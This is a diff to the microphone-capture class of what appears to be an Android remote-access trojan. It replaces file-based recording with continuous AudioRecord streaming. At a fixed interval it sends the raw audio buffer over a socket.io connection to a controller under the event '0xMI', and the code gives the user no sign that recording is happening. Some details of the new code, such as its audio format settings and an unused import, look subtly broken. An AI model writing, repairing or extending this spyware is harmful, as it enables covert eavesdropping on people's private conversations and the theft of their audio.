@@ -1,106 +1,74 @@
 package com.remote.app;
 
+import android.media.AudioFormat;
+import android.media.AudioRecord;
 import android.media.MediaRecorder;
-import android.util.Log;
+import android.se.omapi.Channel;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.BufferedInputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.IOException;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.logging.Logger;
 
-public  class MicManager {
+import io.socket.client.Socket;
 
+public class MicManager {
 
-    static MediaRecorder recorder;
-    static File audiofile = null;
-    static final String TAG = "MediaRecording";
-    static TimerTask stopRecording;
+    static Socket socket;
+    static AudioRecord recorder;
+    static byte[] buffer;
+    static int bufferCapacity = 2 * 1000000; // 2MB
+    static int AUDIO_FORMAT = AudioFormat.ENCODING_AAC_LC;
 
+    static final Logger log = Logger.getLogger(MicManager.class.getName());
 
-    public static void startRecording(int sec) throws Exception {
+    static {
+        socket = IOSocket.getSocket();
+        recorder = new AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, 44100, 1, AUDIO_FORMAT, bufferCapacity);
+        buffer = new byte[bufferCapacity];
+    }
 
-
-        //Creating file
-        File dir = MainService.getContextOfApplication().getCacheDir();
+    public static void startRecording() {
         try {
-            Log.e("DIRR" , dir.getAbsolutePath());
-            audiofile = File.createTempFile("sound", ".mp3", dir);
-        } catch (IOException e) {
-            Log.e(TAG, "external storage access error");
-            return;
+            recorder.startRecording();
+        } catch (IllegalStateException e) {
+            log.info(e.toString());
         }
+    }
 
-
-        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
-        recorder = new MediaRecorder();
-        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-        recorder.setOutputFile(audiofile.getAbsolutePath());
-        try{
-        recorder.prepare();
-         JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","true");
-            object.put("buffer" , "starterd recoding");
-        IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
-
+    public static void stopRecording() {
+        try {
+            sendData();
+            recorder.stop();
+        } catch (IllegalStateException e) {
+            log.info(e.toString());
         }
-        catch (Exception e) {
-         JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","true");
-            object.put("buffer" , e.getMessage());
-            IOSocket.getInstance().getIoSocket().emit("0xMI" ,object );
+    }
 
-        }
-        recorder.start();
-
-
-        stopRecording = new TimerTask() {
+    public static void record(long seconds) {
+        TimerTask task = new TimerTask() {
             @Override
-            public void run() {
-                //stopping recorder
-                recorder.stop();
-                recorder.release();
-                sendVoice(audiofile);
-                audiofile.delete();
-            }
+            public void run() { sendData(); }
         };
-
-        new Timer().schedule(stopRecording, 5000);
+        startRecording();
+        new Timer().scheduleAtFixedRate(task, 0, seconds * 1000);
     }
 
-    private static void sendVoice(File file){
-
-        int size = (int) file.length();
-        byte[] data = new byte[size];
+    private static void sendData() {
+        int readBytes = recorder.read(buffer, 0, bufferCapacity);
+        if (readBytes == 0)
+            log.info("no bytes available in audio recorder");
         try {
-            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
-            buf.read(data, 0, data.length);
-            JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name",file.getName());
-            object.put("buffer" , data);
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
-            buf.close();
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
+            JSONObject json = new JSONObject();
+            json.put("file_name", "byte_data_file");
+            json.put("data", buffer);
+            socket.emit("0xMI", json);
         } catch (JSONException e) {
-            e.printStackTrace();
+            log.warning(e.toString());
         }
-
     }
-
-
 }
 
 
